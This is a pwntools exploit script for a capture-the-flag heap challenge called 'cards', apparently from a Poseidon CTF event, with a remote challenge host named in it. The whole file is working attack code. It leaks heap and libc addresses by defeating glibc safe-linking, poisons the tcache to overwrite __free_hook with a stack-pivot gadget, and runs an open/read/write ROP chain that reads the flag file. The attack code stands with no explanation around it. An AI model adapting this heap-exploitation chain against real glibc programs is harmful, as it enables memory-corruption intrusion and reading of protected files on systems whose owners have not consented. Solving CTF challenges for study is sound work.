from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './cards'
HOST = 'poseidonchalls.westeurope.cloudapp.azure.com'
PORT = 9004 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        # return process(TARGET)
        # return process(['./ld-2.32.so', TARGET], env={"LD_PRELOAD":"/home/jt/glibc/2.32/libc.so.6"})
        return process(['./ld-2.32.so', TARGET], env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(size, color, name):
    r.sendlineafter('Choice: ', '1')
    r.sendafter(': ', str(size))
    r.sendafter(': ', color)
    r.sendafter(': ', name)

def delete(idx):
    r.sendlineafter('Choice: ', '2')
    r.sendlineafter(': ', str(idx))

def edit(idx, name):
    r.sendlineafter('Choice: ', '3')
    r.sendlineafter(': ', str(idx))
    r.sendafter(': ', name)

def show(idx):
    r.sendlineafter('Choice: ', '4')
    r.sendlineafter(': ', str(idx))

r = start()

alloc(0x100, 'AAAA', 'A') #0 +0x2a0
alloc(0x100, 'AAAA', 'A') #1 +0x410
delete(0)
delete(1)

alloc(0x100, 'BBBB', '\xff') #2 +0x440
alloc(0x100, 'BBBB', '\xff') #3 +0x2d0
show(2)
r.recvuntil('name: ')
leak1 = u64(r.recvuntil('.\n')[:-2].ljust(8, '\x00'))

show(3)
r.recvuntil('name: ')
leak2 = u64(r.recvuntil('.\n')[:-2].ljust(8, '\x00'))
dbg('leak1')
dbg('leak2')
heap = (leak1 ^ leak2) - 0x300
assert heap & 0x0000fff000000000 != 0

dbg('heap')

alloc(0x100, 'CCCC', p64(0x21)*(0x100/8)) #4 +0x580
alloc(0x100, 'DDDD', p64(0x21)*(0x100/8)) #5 +0x6f0

delete(4)
delete(2)

capsled = (heap+0x2c0) ^ (heap >> 12)
edit(2, p64(capsled))

alloc(0x100, 'EEEE', 'hoge') #6
payload = ''
payload += flat(0, 0x31, 0x31337, 7, heap+0x410, 1, 0, 0x421)
alloc(0x100, 'FFFF', payload) #7

payload = ''
payload += flat(0x1337, 6, heap+0x300, 1, 0)
edit(3, payload) # edit chunk #6
delete(6)

payload = ''
payload += flat(0, 0x31, 0x31337, 7, heap+0x2e0, 1, heap+0x300)
edit(7, payload) # chunk #3 points libc

edit(3, '\x01')
show(3)
r.recvuntil('name: ')
leak = u64(r.recvuntil('.\n')[:-2].ljust(8, '\x00'))
base = leak - 0x3b6c01
assert base > 0
dbg('leak')
dbg('base')
fh = base + 0x3b8e80
add_rsp = base + 0x00077f66

rbp = base + 0x00111489
leave = base + 0x00101fc0

rdi = base + 0x00100cea
syscall = base + 0x0010eff7
rdx = base + 0x00032035
rsi = base + 0x0010077b
rax = base + 0x000f3763

# overwrite fh with 1st pivot to stack + 0x38
payload = ''
payload += flat(0, 0x31, 0x31337, 7, heap+0x2e0, 1, fh)
edit(7, payload) # chunk #3 points fh
edit(3, p64(add_rsp)) # overwrite fh

if args.D:
    debug(r, [0xbc1])

# build ORW rop in heap 
payload = ''
payload += flat(0, 0x31, 0x31337, 7, heap+0x2e0, 1, heap+0x300)
edit(7, payload) # chunk #3 points heap addr
payload = ''
payload += flat(rdi, heap+0x3d8, rsi, 0, rdx, 0, rax, 2, syscall) #0x68
payload += flat(rdi, 3, rsi, heap+0x100, rdx, 0x100, rax, 0, syscall) #0xb0
payload += flat(rdi, 1, rsi, heap+0x100, rdx, 0x100, rax, 1, syscall) #0xf8
payload += "/home/challenge/flag\x00"
edit(3, payload) # rop chain

# rop in stack 2nd pivot to heap
r.sendlineafter('Choice: ', '6')
r.sendafter(': ', flat(rbp, heap+0x300-8, leave))
delete(3)

r.interactive()
r.close()
